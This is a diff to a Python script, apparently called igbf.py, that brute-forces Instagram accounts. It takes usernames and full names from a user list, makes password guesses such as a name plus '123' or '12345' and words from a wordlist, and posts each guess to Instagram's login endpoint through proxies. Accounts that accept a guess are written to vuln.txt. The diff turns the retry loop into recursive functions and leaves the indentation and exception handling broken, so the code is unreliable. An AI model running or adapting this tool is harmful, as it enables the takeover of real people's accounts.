@@ -80,7 +80,7 @@ except FileNotFoundError:
        time.sleep(2)
        os.system("python igbf.py")
 pwd1=pwd.strip().split('\n')
-try:
+def pkwd():
        with ThreadPoolExecutor(max_workers=10) as ex:
             ex.submit(True)
             for x in js['users']:
@@ -117,48 +117,47 @@ try:
                                             break
                                   else:
                                        print("\033[00m[\033[91mx\033[00m]"+us+ '|' +passw)
+                               except KeyError:
+                                      pkwd()
+pkwd()
                             
-                              except KeyError:      
-                                     time.sleep(10)    
-                                     with ThreadPoolExecutor(max_workers=10) as ex:
-                                          ex.submit(True)
-                                          for x in js['users']:
-                                              us= x['user']['username']
-                                              name=x['user']['full_name']
-                                              ss=name.split('|')
-                                              fln=ss[0].split(' ')
-                                              for x in fln:
-                                                  litpas = [
-                                                         str(x) + "123",
-                                                         str(x) + "12345",
-                                                  ]
-                                                  with ThreadPoolExecutor(max_workers=10) as ex:
-                                                       for passw in pwd1:
-                                                           b=passw.split(' ')
-                                                           for x in b:
-                                                               litpas.append(x)
-                                                       for passw in set(litpas):
-                                                           time.sleep(2)
-                                                           reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
-                                                           js1=json.loads(reg.text)
-                                                           try:
-                                                              if 'Please wait a few minutes before you try again.' in js1:
-                                                                 print("\033[00mPlease Waiting...\033[91m!\033[00m")
-                                                                 time.sleep(10)
-                                                                 os.system('python igbf.py')
-                                                              elif js1['authenticated'] == True:
-                                                                   result+=1
-                                                                   vuln.append(us+"|"+passw)
-                                                                   print('\033[00m[|033[92m+\033[00m]'+us+'|'+passw)
-                                                                   with open('vuln.txt','a') as x:
-                                                                        x.write(us + '|' + passw + '\n')
-                                                                        sys.exit('\033[00mPassword \033[92mFound\033[00m')
+def gpkwd():      
+    time.sleep(10)    
+     with ThreadPoolExecutor(max_workers=10) as ex:
+           ex.submit(True)
+           for x in js['users']:
+               us= x['user']['username']
+               name=x['user']['full_name']
+               ss=name.split('|')
+               fln=ss[0].split(' ')
+               for x in fln:
+                   litpas = [
+                         str(x) + "123",
+                         str(x) + "12345",
+                   ]
+                   litpas.append(x)
+                   for passw in set(litpas):
+                       time.sleep(2)
+                       reg = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=ua, data={'username': us,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{passw}','queryParams': '{}'}, proxies=pro, timeout=10)
+                       js1=json.loads(reg.text)
+                       try:
+                           if 'Please wait a few minutes before you try again.' in js1:
+                               print("\033[00mPlease Waiting...\033[91m!\033[00m")
+                               time.sleep(10)
+                               gpkwd()
+                           elif js1['authenticated'] == True:
+                                    result+=1
+                                    vuln.append(us+"|"+passw)
+                                    print('\033[00m[|033[92m+\033[00m]'+us+'|'+passw)
+                                    with open('vuln.txt','a') as x:
+                                         x.write(us + '|' + passw + '\n')
+                                         sys.exit('\033[00mPassword \033[92mFound\033[00m')
                                                          
-                                                              else:
-                                                                   print('\033[00m[\033[91mx\033[00m]'+us+ '|' +passw)
-                                                           except KeyError:
-                                                                   print('\033[91mError!\033[00m')
-                                                                   time.sleep(10)
-                                                                   os.system('python igbf.py')
-except requests.exceptions.ConnectionError:
-         sys.exit('\033[91mConnection Error\033[00m')
+                           else:
+                                   print('\033[00m[\033[91mx\033[00m]'+us+ '|' +passw)
+                        except KeyError:
+                                   print('\033[91mError!\033[00m')
+                                   time.sleep(10)
+                                   gpkwd()
+                        except requests.exceptions.ConnectionError:
+                               sys.exit('\033[91mConnection Error\033[00m')
